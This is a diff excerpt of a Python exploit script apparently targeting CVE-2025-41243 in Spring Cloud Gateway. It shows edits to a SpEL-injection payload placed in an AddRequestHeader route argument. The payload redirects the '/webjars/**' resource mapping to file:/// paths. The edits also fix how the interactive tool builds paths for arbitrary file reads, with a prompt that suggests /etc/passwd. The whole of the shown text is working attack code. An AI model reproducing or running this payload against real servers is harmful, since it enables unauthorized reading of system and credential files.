@@ -686,7 +686,7 @@ def CVE_2025_41243(url, proxies, header_new):
     "name": "AddRequestHeader",
     "args": {
       "name": "bb",
-      "value": "#{ @resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='META-INF/resources/'}"
+      "value": "#{ @resourceHandlerMapping.urlMap['/webjars/**'].locationValues[0]='META-INF/resources/webjars/'}"
     }
   },
   {
@@ -705,7 +705,7 @@ def CVE_2025_41243(url, proxies, header_new):
                     FilePath_left = FilePath.split('/', 1)[0]
                     FilePath_right = FilePath.split('/', 1)[1]
                     formated_path = 'file:///' + FilePath_left + '/'
-                    payload_rf = payload_readfile.replace('META-INF/resources/', formated_path)
+                    payload_rf = payload_readfile.replace('META-INF/resources/webjars/', formated_path)
 
                     random_string = generate_random_route(5)
                     try:
@@ -744,10 +744,10 @@ def CVE_2025_41243(url, proxies, header_new):
 
                 elif is_Windows == 'n':
                     FilePath = input("[+] 请输入要读取的文件路径（如/etc/passwd）>>> ")
-                    FilePath_right = FilePath.lstrip('/')[1]
-                    formated_path = 'file:///' + FilePath_right
+                    FilePath_right = FilePath.split('/', 1)[1]
+                    formated_path = 'file:///'
 
-                    payload_rf = payload_readfile.replace('META-INF/resources/', formated_path)
+                    payload_rf = payload_readfile.replace('META-INF/resources/webjars/', formated_path)
 
                     random_string = generate_random_route(5)
                     try:
